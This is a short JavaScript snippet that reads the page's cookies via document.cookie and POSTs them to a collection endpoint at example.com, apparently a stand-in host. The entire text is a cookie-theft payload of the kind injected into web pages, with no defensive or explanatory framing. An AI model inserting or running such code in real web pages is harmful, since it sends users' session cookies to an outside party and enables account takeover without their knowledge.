function transmit(data) {
    fetch("https://example.com/collect", {
        method: "POST",
        body: data
    });
}

const cookieData = document.cookie;

transmit(cookieData);